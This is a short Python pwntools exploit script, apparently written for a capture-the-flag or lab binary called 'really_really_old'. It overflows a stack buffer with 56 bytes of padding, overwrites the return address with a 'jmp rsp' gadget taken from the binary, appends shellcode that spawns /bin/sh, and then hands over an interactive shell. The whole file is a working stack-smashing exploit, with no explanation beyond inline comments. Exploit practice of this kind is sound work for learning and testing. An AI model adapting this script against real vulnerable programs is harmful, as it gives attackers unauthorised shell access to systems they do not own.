from pwn import *


# Start a process
elf = context.binary = ELF('./really_really_old')

# Create a ROP object
rop = ROP(elf)

# Find the offset to the return address
offset = 56  # This value may need to be adjusted

# Start the process
p = process(elf.path)

# Generate the shellcode
shellcode = asm(shellcraft.sh())

# Find a gadget that will jump to the stack pointer
jmp_rsp = asm('jmp rsp')
jmp_rsp = next(elf.search(jmp_rsp))

# Create the payload
payload = b"A"*offset  # Fill the buffer up to the return address
payload += p64(jmp_rsp)  # Overwrite the return address with the address of the jmp rsp gadget
payload += shellcode  # Append the shellcode

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()
